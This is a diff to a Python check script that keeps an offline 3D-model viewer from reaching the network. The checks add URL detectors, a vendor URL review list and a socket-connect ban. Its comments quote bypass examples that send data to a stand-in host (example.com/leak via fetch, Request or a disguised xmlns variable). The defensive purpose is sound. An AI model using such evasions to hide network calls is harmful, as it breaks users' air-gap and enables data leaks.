@@ -80,6 +80,57 @@ def scanned_sources() -> list[str]:
     return sorted(set(rels))
 
 
+# A remote URL with a scheme, and a protocol-relative one inside a string literal.
+# "//host" only counts when a quote opens it and a dotted hostname follows, so
+# JS comments ("// note") and path joins ("a + '/' + b") do not match. Codex
+# review round 6: the backstop once recognised only the first form, and
+# fetch(new Request('//example.com/leak')) passed every check.
+REMOTE_LITERAL = re.compile(r"""(?:https?|wss?|ftps?)://[^\s'"`)<>\\]+""", re.I)
+PROTOCOL_RELATIVE = re.compile(r"""(['"`])(//[a-z0-9-]+(?:\.[a-z0-9-]+)+[^'"`\s]*)""", re.I)
+
+# The only XML namespaces the viewer could legitimately declare. A namespace URI
+# names a vocabulary and is never fetched -- but only as a markup attribute.
+KNOWN_XML_NAMESPACES = frozenset({
+    "http://www.w3.org/2000/svg",
+    "http://www.w3.org/1999/xlink",
+    "http://www.w3.org/1999/xhtml",
+    "http://www.w3.org/1998/Math/MathML",
+    "http://www.w3.org/XML/1998/namespace",
+    "http://www.w3.org/2000/xmlns/",
+})
+
+
+def unescape_slashes(text: str) -> str:
+    """`"https:\\/\\/host"` in a JS string evaluates to https://host."""
+    return text.replace("\\/", "/")
+
+
+def remote_urls(text: str) -> list:
+    """(offset, url) for every remote URL in text: schemed, and quoted protocol-relative."""
+    text = unescape_slashes(text)
+    found = [(m.start(), m.group(0)) for m in REMOTE_LITERAL.finditer(text)]
+    found += [(m.start(2), m.group(2)) for m in PROTOCOL_RELATIVE.finditer(text)]
+    return sorted(found)
+
+
+def is_namespace_declaration(text: str, offset: int, url: str) -> bool:
+    """True only for a genuine xmlns attribute, inside a tag, naming a known namespace.
+
+    Codex review round 6: the first version exempted any URL whose preceding TEXT
+    ended in `xmlns=`, so `const xmlns = 'https://example.com/leak'; fetch(xmlns)`
+    passed every check. Three conditions now all have to hold: the URL is one of
+    the W3C namespaces, it is the value of an xmlns attribute, and that attribute
+    sits inside an open tag. Only markup files are ever asked.
+    """
+    if url not in KNOWN_XML_NAMESPACES:
+        return False
+    before = text[:offset]
+    if not re.search(r"""\sxmlns(?::[\w-]+)?\s*=\s*["']$""", before):
+        return False
+    tag_open = before.rfind("<")
+    return tag_open != -1 and ">" not in before[tag_open:]
+
+
 def shipped_js() -> list[str]:
     """The .js files among scanned_sources(): every script fragment that ships."""
     return [r for r in scanned_sources() if r.endswith(".js")]
@@ -229,6 +280,37 @@ def _vendor_intact():
 
 # ------------------------------------------------------------------ PRODUCT ---
 
+@check("PRODUCT  every remote URL in vendor/ has been reviewed (vendor/URLS)")
+def _vendor_urls_reviewed():
+    """vendor/ is excluded from the offline scans, so it needs its own guard.
+
+    SHA256SUMS protects against accidental edits, but a deliberate upgrade
+    refreshes it by design -- on exactly the commit that brings in new
+    third-party code. Codex review round 6: fetch("https://example.com/leak")
+    appended to STLLoader.js, with SHA256SUMS refreshed, passed all 15 checks.
+
+    Classifying vendor URLs automatically would mean parsing minified code, which
+    is how a misfiring comment-stripper hides a real fetch. Instead every URL is
+    listed in vendor/URLS and reviewed once; a new one fails here, by name, until
+    someone adds it in a readable diff. The hash diff says "something changed";
+    this says what.
+    """
+    baseline = VENDOR / "URLS"
+    if not baseline.is_file():
+        return ["vendor/URLS is missing -- every remote URL in vendor/ must be reviewed"]
+    reviewed = {ln.strip() for ln in baseline.read_text(encoding="utf-8").splitlines()
+                if ln.strip() and not ln.lstrip().startswith("#")}
+    problems = []
+    for f in sorted(VENDOR.glob("*.js")):
+        text = f.read_text(encoding="utf-8", errors="replace")
+        for url in sorted({u for _, u in remote_urls(text)} - reviewed):
+            problems.append(
+                f"vendor/{f.name} contains a remote URL not in vendor/URLS: {url!r}. "
+                f"Read the code around it: if it is a doc link or an XML namespace, add "
+                f"it to vendor/URLS; if code can fetch it, the upgrade breaks the air-gap")
+    return problems
+
+
 @check("PRODUCT  viewer.html loads nothing from the network")
 def _no_external_resources():
     html = VIEWER.read_text(encoding="utf-8", errors="replace")
@@ -369,21 +451,26 @@ def _no_remote_url_literal():
     is far worse than a false positive, so a reference link in a comment should
     be written without its scheme ("threejs.org/docs").
 
-    Two limits, stated rather than hidden: a URL assembled at runtime from
-    fragments cannot be seen by any static check (NETWORK_APIS catches the APIs
-    that would carry one), and a protocol-relative "//host" is caught by the
-    attribute, CSS and fetch scans rather than here.
+    The namespace exemption is narrow on purpose -- see is_namespace_declaration.
+    Protocol-relative "//host" literals are matched here too; an earlier version
+    said the attribute, CSS and fetch scans covered them, and new Request('//...')
+    fell between all three. Escaped slashes ("https:\\/\\/") are unescaped first.
+
+    One limit, stated rather than hidden: a URL assembled at runtime from
+    fragments ("ht" + "tps://") cannot be seen by any static check. NETWORK_APIS
+    catches the APIs that would carry one; a Content-Security-Policy in
+    viewer.html is what would actually close it.
     """
-    literal = re.compile(r"""(?:https?|wss?|ftps?)://[^\s'"`)<>\\]+""", re.I)
-    inert = re.compile(r"""xmlns(?::[\w-]+)?\s*=\s*["']?$""", re.I)
     problems = []
     for rel in scanned_sources():
-        text = (ROOT / rel).read_text(encoding="utf-8")
-        for m in literal.finditer(text):
-            if inert.search(text[max(0, m.start() - 48):m.start()]):
+        raw = (ROOT / rel).read_text(encoding="utf-8")
+        text = unescape_slashes(raw)          # same length per line: offsets stay valid
+        markup = rel.endswith(".html")
+        for offset, url in remote_urls(raw):
+            if markup and is_namespace_declaration(text, offset, url):
                 continue
-            line = text.count("\n", 0, m.start()) + 1
-            problems.append(f"{rel}:{line} contains a remote URL {m.group(0)!r}. If it is a "
+            line = text.count("\n", 0, offset) + 1
+            problems.append(f"{rel}:{line} contains a remote URL {url!r}. If it is a "
                             f"reference in a comment, drop the scheme; if the code uses it, "
                             f"the viewer is no longer air-gapped")
     return problems
@@ -408,16 +495,38 @@ def _loopback_only():
 @check("PRODUCT  stepview.py imports nothing outside the stdlib but cascadio")
 def _stdlib_only():
     src = (ROOT / "stepview.py").read_text(encoding="utf-8")
+    # Submodule level, on purpose. Allowing `urllib` wholesale let
+    # `urllib.request.urlopen("https://...")` pass every check while phoning home
+    # -- found by probing the rest of the class Codex review round 6 opened, not
+    # by the review itself. The stdlib is a closed set, so listing the SAFE
+    # imports rejects http.client, ftplib, smtplib and friends unnamed.
     allowed = {
-        "argparse", "hashlib", "http", "json", "socket", "sys", "tempfile",
-        "threading", "time", "webbrowser", "pathlib", "urllib", "cascadio", "re",
-        "__future__",
+        "__future__", "argparse", "hashlib", "http.server", "json", "re", "socket",
+        "sys", "tempfile", "threading", "time", "webbrowser", "pathlib",
+        "urllib.parse", "cascadio",
     }
     problems = []
-    for m in re.finditer(r"^\s*(?:import|from)\s+([a-zA-Z0-9_]+)", src, re.M):
+    for m in re.finditer(r"^\s*(?:import|from)\s+([a-zA-Z0-9_.]+)", src, re.M):
         mod = m.group(1)
         if mod not in allowed:
-            problems.append(f"stepview.py imports {mod!r}, which is not stdlib or cascadio")
+            problems.append(f"stepview.py imports {mod!r}, which is not on the allowlist -- "
+                            f"the launcher is stdlib + cascadio, and must not reach the network")
+    return problems
+
+
+@check("PRODUCT  stepview.py uses its socket to listen, never to connect")
+def _socket_listens_only():
+    """`socket` is allowed because the server binds with it -- and it can dial out.
+
+    The import allowlist cannot tell those apart, so this does: a connect call in
+    the launcher is an outbound connection, and README promises tessellation
+    happens "never in the cloud".
+    """
+    src = (ROOT / "stepview.py").read_text(encoding="utf-8")
+    problems = []
+    for m in re.finditer(r"\.connect(?:_ex)?\s*\(|\bcreate_connection\s*\(", src):
+        line = src.count("\n", 0, m.start()) + 1
+        problems.append(f"stepview.py:{line} opens an outbound connection ({m.group(0).strip()})")
     return problems
 
 
